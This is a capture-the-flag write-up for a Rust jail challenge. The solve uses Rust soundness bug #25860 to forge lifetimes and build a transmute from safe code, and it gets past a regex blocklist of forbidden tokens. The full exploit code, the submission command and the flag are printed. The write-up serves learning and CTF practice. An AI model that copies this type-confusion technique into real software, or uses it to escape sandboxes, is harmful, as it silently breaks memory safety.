# blazinglyfast

**Category:** Jail | **Difficulty:** Hard | **Flag:** `bctf{1mpl1ed_b0unds_on_n3st3d_ref3rence5_25860}`

## TL;DR

A Rust code jail that forbids `unsafe` — solved by exploiting a real, still-open Rust soundness bug (#25860) to launder lifetimes and build a `mem::transmute` from 100% safe code, then using it to reinterpret `In` as `Out`.

## What We're Given

A Python server (`chall.py`) that:

1. Prompts us for the **body** of a single Rust function: `pub fn jail(input: In) -> Out { ... }`
2. Validates our input against a regex blocklist
3. Drops our code into a template, compiles it with `rustc` (stable, `-O`, targeting `i686-unknown-linux-gnu`)
4. Runs the compiled binary
5. Checks whether the output is a secret random token embedded at compile time — if so, prints the flag

The template defines two structs in a private `host` module:

```rust
#[repr(C)] pub struct In(SecretIn);
#[repr(C)] pub struct Out(SecretOut);
```

Both `SecretIn` and `SecretOut` are `#[repr(C)]` structs with identical field layouts — a function pointer, a `u64` cookie, a `u64` folded value, and a `[u64; 2]` pair — just wrapped in different private newtypes (`GateIn`/`GateOut`, `CookieIn`/`CookieOut`).

Our code runs inside `mod usercode` which is annotated with `#[forbid(unsafe_code)]`. We can see `In` and `Out` as types, but that's it — all inner fields are private.

The forbidden tokens (checked by regex before compiling):

```
\bunsafe\b   \bextern\b   \btrait\b   \bimpl\b   \bstd\b   \#   \!
```

No unsafe. No macros (the `!` ban kills `println!`, `vec!`, `unreachable!`, everything). No `std`. No `impl` blocks. No traits. No `#[...]` attributes. No `extern`.

The goal: produce an `Out` that passes the host's `check()` function, which verifies that `out.gate` still points to `reveal_token` and all the cookie/folded/pair fields are correct. Since the flag changes every run (it's a fresh random token embedded at compile time), we can't hardcode it — we have to actually produce a valid `Out` from the `In` we're handed.

## Initial Recon

The most obvious thought: `In` and `Out` are byte-for-byte identical in memory. If we could just reinterpret the bytes — `mem::transmute(input)` — we'd be done. Let's see why every normal approach dies:

- **`core::mem::transmute(input)`** — E0133: unsafe function. Can't call it without `unsafe`.
- **`let In(inner) = input`** — E0603: `SecretIn` is a private type. The tuple struct constructor is private, so we can't destructure it.
- **`Box<dyn Any>::downcast::<Out>()`** — `TypeId` for `In` != `TypeId` for `Out`. Fails at runtime.
- **Raw pointer cast + deref** — dereferencing a raw pointer requires `unsafe`. Blocked.
- **`union U { a: In, b: Out }`** — reading a union field always requires `unsafe`. Blocked.
- **Scope trick** — the `#[forbid(unsafe_code)]` applies to the whole module, but more importantly the `\bunsafe\b` regex blocks the word entirely. We can't even write it.
- **`/proc/self/mem`** — `std` is regex-blocked. `core::fs` doesn't exist.
- **`fn_addr_eq` collision via ICF** — `reveal_token` contains a unique random string, so the compiler can't merge its body with a decoy we write. Dead end.

We're stuck. Everything that could work requires `unsafe` in some form.

## The Vulnerability / Trick

The challenge name "blazinglyfast" is a direct wink at [cve-rs](https://github.com/Speykious/cve-rs) — a project with the tagline *"Blazingly fast memory vulnerabilities, written in 100% safe Rust."* That's our hint.

cve-rs exploits **Rust issue #25860**, titled "Implied bounds on nested references + variance = soundness hole." It was opened in 2015. It is **still open on stable Rust** as of this challenge. Yes, 2015. An 11-year-old soundness bug in the language that markets itself on memory safety. No judgment, just appreciation.

Here's the core of the bug. Consider this function:

```rust
fn lt_mut<'a, 'b, T: ?Sized>(_: &'a &'b (), v: &'b mut T) -> &'a mut T { v }
```

This takes a nested reference `&'a &'b ()` and a `&'b mut T`, and returns `&'a mut T`. For this to be sound, Rust needs `'b: 'a` (the inner lifetime must outlive the outer one). The `_: &'a &'b ()` parameter implies this constraint — if you hold a `&'a` reference to something that itself contains a `&'b` reference, then `'b` must outlive `'a`.

Rust *does* enforce this constraint when you call `lt_mut` normally. But here's where variance bites us: if we **coerce `lt_mut` to a higher-ranked `fn` pointer**, the implied bound gets silently dropped:

```rust
let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lt_mut;
```

The `for<'x>` means "for any lifetime `'x`." The constraint `'b: 'x` that should exist is gone. Now `f` accepts a `&'x mut T` with ANY lifetime and hands back a `&'b mut T` — a reference completely decoupled from the input's actual lifetime. We've broken the borrow checker's central guarantee.

We wrap this into a helper called `expand_mut`:

```rust
fn expand_mut<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lt_mut;
    f(&&(), x)
}
```

This takes any `&'a mut T` and returns a `&'b mut T` where `'b` is whatever lifetime the caller wants — including `'static` if needed. We've built a lifetime laundering machine in safe code.

Now we turn that into a full `transmute`. The trick uses an `enum`:

```rust
enum D<A, B> { A(Option<Box<A>>), B(Option<Box<B>>) }
```

Because this is a `#[repr(Rust)]` enum (the default), both variants share the same in-memory slot for the `Option<Box<_>>` payload — they overlap at the same address. The key insight: if we hold a `&mut Option<Box<B>>` pointing at the slot, and then overwrite the whole enum with the `A` variant containing a `Box<A>`, the pointer we're holding now physically points to a `Box<A>` but is still typed as `&mut Option<Box<B>>`. That's type confusion. That's transmute.

Here's the full dance:

```rust
fn transmute_inner<A, B>(dummy: &mut D<A, B>, obj: A) -> B {
    // Step 1: get a reference to the B slot
    let ref_to_b = match dummy {
        D::B(r) => r,
        _ => loop {},       // impossible arm; loop{} avoids needing unreachable!()
    };
    // Step 2: launder ref_to_b's lifetime so it survives past the next line
    let ref_to_b: &mut Option<Box<B>> = expand_mut(ref_to_b);
    // Step 3: overwrite the enum with the A variant, boxing our actual value
    *dummy = D::A(Some(Box::new(obj)));
    core::hint::black_box(dummy);   // prevent optimizer from noticing the alias
    // Step 4: read out through the (now-stale, but laundered) B-typed reference
    *ref_to_b.take().unwrap()
}

fn trans<A, B>(obj: A) -> B {
    transmute_inner(core::hint::black_box(&mut D::B(None)), obj)
}
```

`core::hint::black_box` — which is in `core`, not `std`, so it passes the regex filter — tells the optimizer "don't you dare touch this." Without it, the compiler might realize that `ref_to_b` and `dummy` alias the same memory and eliminate the write, breaking the exploit.

Since `In` and `Out` have identical `#[repr(C)]` layouts byte-for-byte, `trans::<In, Out>(input)` reinterprets all 40 bytes of `In` (gate function pointer + cookie + folded + pair) as `Out`. The `gate` field — which was a `GateIn(fn() -> &'static str)` pointing to `reveal_token` — comes out the other side as a `GateOut(fn() -> &'static str)` still pointing to `reveal_token`. All the numeric fields are identical. The host's `check()` passes, and we get the flag.

## Building the Exploit

The solve body is 24 lines. Let's walk through each piece.

**The lifetime bug:**

```rust
fn lt_mut<'a, 'b, T: ?Sized>(_: &'a &'b (), v: &'b mut T) -> &'a mut T { v }
fn expand_mut<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lt_mut;
    f(&&(), x)
}
```

`lt_mut` is the raw bug. `expand_mut` is the wrapper that gives us a clean API: hand in a reference with any lifetime, get back a reference with whatever lifetime you need. The coercion to `for<'x> fn(...)` is where the implied bound `'b: 'x` gets dropped.

**The transmute infrastructure:**

```rust
enum D<A, B> { A(Option<Box<A>>), B(Option<Box<B>>) }
```

This enum is the jig we use to overlap types. Both variants hold an `Option<Box<_>>` — and in Rust's default enum representation, they share the same memory location for that payload.

**The actual transmute:**

```rust
fn transmute_inner<A, B>(dummy: &mut D<A, B>, obj: A) -> B {
    let ref_to_b = match dummy {
        D::B(r) => r,
        _ => loop {},
    };
    let ref_to_b: &mut Option<Box<B>> = expand_mut(ref_to_b);
    *dummy = D::A(Some(Box::new(obj)));
    core::hint::black_box(dummy);
    *ref_to_b.take().unwrap()
}

fn trans<A, B>(obj: A) -> B {
    transmute_inner(core::hint::black_box(&mut D::B(None)), obj)
}
```

A few non-obvious details worth calling out:

- `_ => loop {}` instead of `_ => unreachable!()` — `unreachable!` uses `!` which is regex-blocked. `loop {}` is an infinite loop that's also `!` (never) type in Rust's type system, so it satisfies the match arm type.
- `core::hint::black_box` not `std::hint::black_box` — `std` is regex-blocked, but `core` is fine.
- The outer `core::hint::black_box(&mut D::B(None))` in `trans` prevents the compiler from seeing the initial value of `dummy` as a constant and optimizing away the B-branch of the match.

**The payload — the last line of our function body:**

```rust
trans::<In, Out>(input)
```

That's it. We hand in the `In` we received, get back an `Out`, and return it. Because the layouts match exactly, every byte is preserved, including the `reveal_token` function pointer in the `gate` field.

The full solve file is at `solve_body.rs` — only 24 lines, 707 bytes, well under the 4000-byte limit.

**Sending it:**

```bash
{ cat solve_body.rs; printf "EOF\n"; sleep 40; } | ncat --ssl -v blazinglyfast.opus4-7.b01le.rs 8443
```

The `sleep 40` keeps stdin open so the server's 5-second run timeout completes before our pipe closes. The server speaks TLS, hence `ncat --ssl`.

## Running It

Local (Docker, test flag):

```
$ (cat solve_body.rs; echo "EOF") | nc -w 30 localhost 1337
Target: i686-unknown-linux-gnu
Enter the BODY of `pub fn jail(input: In) -> Out { ... }`
Finish with EOF (Ctrl+D) or a line containing only 'EOF'.

bctf{test_flag}
```

Remote:

```
$ { cat solve_body.rs; printf "EOF\n"; sleep 40; } | ncat --ssl -v blazinglyfast.opus4-7.b01le.rs 8443
...
bctf{1mpl1ed_b0unds_on_n3st3d_ref3rence5_25860}
```

One more thing worth appreciating: the flag itself is `bctf{1mpl1ed_b0unds_on_n3st3d_ref3rence5_25860}` — read it out loud: "implied bounds on nested references 25860." The challenge author embedded the exact name and issue number of the bug we exploited directly in the flag. Beautiful.

## Key Takeaways

**The core technique:** Rust's lifetime variance rules have a soundness hole (#25860) where coercing a function with implied lifetime bounds to a higher-ranked `fn` pointer silently drops those bounds. This lets you forge references with arbitrary lifetimes in 100% safe code.

**The transmute pattern:** Overlapping two enum variants at the same memory location + laundered lifetimes = safe transmute. If you have two types with the same byte layout, you can reinterpret one as the other without ever writing `unsafe`.

**Gotchas we had to navigate:**
- `unreachable!()` is blocked by the `!` regex — use `loop {}` instead (it has type `!`, the never type, which satisfies any type in a match arm)
- `std::hint::black_box` is blocked — use `core::hint::black_box`
- No attributes means no `#[repr(C)]` on our types — but we don't need it since both `In` and `Out` are already `#[repr(C)]` from the host module
- The optimizer will happily eliminate your type confusion if you don't fence it with `black_box` — don't skip it

**Further reading:**
- [cve-rs on GitHub](https://github.com/Speykious/cve-rs) — the project this challenge is named after; has working examples of this and other safe-Rust memory bugs
- [Rust issue #25860](https://github.com/rust-lang/rust/issues/25860) — the original bug report; the discussion is a fascinating read on why this is hard to fix without breaking tons of existing code
- [The Rustonomicon — Subtyping and Variance](https://doc.rust-lang.org/nomicon/subtyping.html) — background on lifetime variance, which is the underlying mechanism being exploited here
